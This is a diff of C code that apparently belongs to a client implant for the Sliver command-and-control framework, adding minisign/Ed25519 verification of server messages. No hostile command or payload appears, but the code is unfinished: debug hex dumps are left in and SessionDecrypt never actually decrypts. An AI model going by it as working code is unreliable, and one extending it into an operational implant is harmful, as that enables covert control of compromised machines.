@@ -1304,15 +1304,19 @@ BOOL VerifySign
 (
 	_In_ PMINISIGN_PUB_KEY pPubKey,
 	_In_ PBYTE pMessage,
-	_In_ DWORD cbMessage
+	_In_ DWORD cbMessage,
+	_In_ BOOL IsHashed
 )
 {
 	UINT16 Algorithm;
 	BYTE KeyID[8];
 	BYTE Signature[ED25519_SIGNATURE_SIZE];
 	BOOL Result = FALSE;
+	PBYTE HashBuffer = NULL;
+	PBYTE pBuffer = NULL;
+	DWORD cbBuffer = 0;
 
-	memcpy(Algorithm, pMessage, sizeof(Algorithm));
+	memcpy(&Algorithm, pMessage, sizeof(Algorithm));
 	memcpy(KeyID, pMessage + sizeof(Algorithm), sizeof(KeyID));
 	memcpy(Signature, pMessage + sizeof(Algorithm) + sizeof(KeyID), sizeof(Signature));
 	if (memcmp(KeyID, pPubKey->KeyId, sizeof(KeyID))) {
@@ -1320,13 +1324,25 @@ BOOL VerifySign
 		goto CLEANUP;
 	}
 
-	if (pPubKey->SignatureAlgorithm != HASH_EDDSA) {
-		LogError(L"SignatureAlgorithm != HASH_EDDSA at %lls.\n", __FUNCTIONW__);
-		goto CLEANUP;
+	pBuffer = pMessage + sizeof(Algorithm) + sizeof(KeyID) + sizeof(Signature);
+	cbBuffer = cbMessage - sizeof(Algorithm) - sizeof(KeyID) - sizeof(Signature);
+	if (pPubKey->SignatureAlgorithm == HASH_EDDSA && !IsHashed) {
+		HashBuffer = Blake2B(pMessage, cbMessage, NULL, 0);
+		pBuffer = HashBuffer;
+		cbBuffer = BLAKE2B_OUTBYTES;
 	}
 
-
+	HexDump(Signature, 64);
+	printf("---------------------------\n");
+	HexDump(pBuffer, cbBuffer);
+	printf("---------------------------\n");
+	HexDump(pPubKey->PublicKey, 32);
+	Result = ED25519Verify(Signature, pBuffer, cbBuffer, pPubKey->PublicKey);
 CLEANUP:
+	if (HashBuffer != NULL) {
+		FREE(HashBuffer);
+	}
+
 	return Result;
 }
 
@@ -1335,17 +1351,31 @@ PBYTE SessionDecrypt
 	_In_ PSLIVER_HTTP_CLIENT pClient,
 	_In_ PBYTE pCipherText,
 	_In_ DWORD cbCipherText,
+	_In_ LPSTR lpServerMinisignPubKey,
 	_Out_ PDWORD pcbPlainText
 )
 {
 	PBYTE pResult = NULL;
+	PMINISIGN_PUB_KEY pDecodedPubKey = NULL;
 
 	if (cbCipherText < MINISIGN_SIZE + 1) {
 		goto CLEANUP;
 	}
 
+	pDecodedPubKey = DecodeMinisignPublicKey(lpServerMinisignPubKey);
+	if (pDecodedPubKey == NULL) {
+		goto CLEANUP;
+	}
+
+	if (!VerifySign(pDecodedPubKey, pCipherText, cbCipherText, FALSE)) {
+		goto CLEANUP;
+	}
 
 CLEANUP:
+	if (pDecodedPubKey != NULL) {
+		FREE(pDecodedPubKey);
+	}
+
 	return pResult;
 }
 
@@ -1381,7 +1411,7 @@ PSLIVER_HTTP_CLIENT SliverSessionInit()
 		goto CLEANUP;
 	}
 
-
+	
 	/////////////////////////////
 	bIsOk = TRUE;
 CLEANUP:
